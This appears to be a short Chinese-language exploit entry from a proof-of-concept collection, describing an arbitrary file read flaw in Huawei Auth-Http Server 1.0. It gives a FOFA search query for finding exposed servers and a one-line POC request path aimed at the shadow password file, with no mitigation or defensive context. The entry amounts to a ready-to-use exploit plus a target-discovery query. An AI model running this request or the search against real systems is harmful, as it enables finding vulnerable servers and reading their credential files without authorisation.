
## 华为Auth-Http Serve任意文件读取
华为Auth-Http服务,华为Auth-Http Server是一款安全认证服务器，在提供安全的远程登录和网络资源访问控制。支持多种认证方式和协议AAA、Radius、TACACS+等，可以实现用户身份认证、授权和审计等功能。同时，可广泛应用于企业、政府、教育等行业的安全架构中。华为Auth-Http Server 1.0任意文件读取，攻击者可通过该漏洞读取任意文件
## fofa
```
server="Huawei Auth-Http Server 1.0"
```

## POC
```
/umweb/shadow
```

![image](https://github.com/wy876/POC/assets/139549762/6e52e737-0076-4630-9d6f-a9f0a355b549)
